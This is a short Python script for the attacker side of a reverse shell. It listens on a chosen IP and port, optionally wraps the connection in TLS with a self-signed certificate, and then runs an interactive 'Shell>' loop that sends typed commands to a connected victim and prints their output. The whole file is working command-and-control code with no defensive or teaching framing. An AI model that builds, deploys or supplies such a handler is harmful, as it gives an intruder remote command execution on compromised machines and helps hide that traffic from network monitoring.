from socket import socket, AF_INET, SOCK_STREAM
import argparse as ap

def connect(ip, port, enc):
    try:
        s = socket(AF_INET, SOCK_STREAM)
        if enc:
            import ssl
            # openssl req -x509 -newkey rsa:4096 -keyout serverkey.pem -out servercert.pem -days 365
            s = ssl.wrap_socket(s, keyfile='serverkey.pem', certfile='servercert.pem', server_side=True, ssl_version=ssl.PROTOCOL_TLSv1)
    except Exception as e:
        print('It was not possible to bind to the address:port provided.')
        raise e

    s.bind((ip, port))
    s.listen(1)

    print('[+] Listening for incoming TCP connection on port %i' % port)
    conn, addr = s.accept()
    print('[+] We got a connection from: %s:%s' % (addr[0], addr[1]))
    return conn

def interact(conn):
    while True:
        command = input("Shell> ")
        if command == 'terminate':
            conn.send('terminate'.encode())
            conn.close()
            break
        else:
            conn.send(command.encode())
            cmdresult = conn.recv(1024).decode()
            print(cmdresult + '\n')


if __name__ == '__main__':
    parser = ap.ArgumentParser()
    parser.add_argument('-i', '--ip', help='The IP address to bind to.', required=True)
    parser.add_argument('-p', '--port', help='The port to connect to.', required=True, type=int)
    parser.add_argument('-s', '--ssl', help='Use this flag if you want to encrypt your connection.', action='store_true')
    args = parser.parse_args()

    interact(connect(args.ip, args.port, args.ssl))